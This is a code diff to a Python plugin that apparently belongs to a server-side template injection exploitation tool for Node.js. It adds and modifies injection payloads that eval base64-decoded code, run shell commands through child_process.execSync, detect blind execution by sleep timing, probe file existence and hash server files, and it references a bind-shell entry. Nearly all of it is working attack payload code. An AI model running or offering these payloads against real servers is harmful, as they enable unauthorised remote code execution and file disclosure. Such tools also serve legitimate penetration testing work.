@@ -50,10 +50,16 @@ class Javascript(Plugin):
                 'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
                 'test_os': """require('os').platform()""",
                 'test_os_expected': r'^[\w-]+$',
+                'test_eval': '"executed".replace("xecu", "valua")',
+                'test_eval_expected': 'evaluated'
             },
             'evaluate_boolean': {
                 'call': 'inject',
                 'evaluate_blind': """[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]"""
+            },
+            'evaluate_blind': {
+                'call': 'inject',
+                'evaluate_blind': """eval(Buffer('{code_b64p}', 'base64').toString())&&require('child_process').execSync('sleep {delay}')"""
             },
             'execute': {
                 'call': 'render',
@@ -72,7 +78,7 @@ class Javascript(Plugin):
                 'call': 'inject',
                 # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                 # TODO: use another function.
-                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')//"""
+                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')"""
             },
             'bind_shell': {
                 'call': 'execute_blind',
@@ -95,6 +101,11 @@ class Javascript(Plugin):
             'md5': {
                 'call': 'render',
                 'md5': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')"
+            },
+            'md5_blind': {
+                'call': 'evaluate_blind',
+                'md5_blind': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
+                'exists_blind': "require('fs').existsSync('{path}')"
             },
         })
 
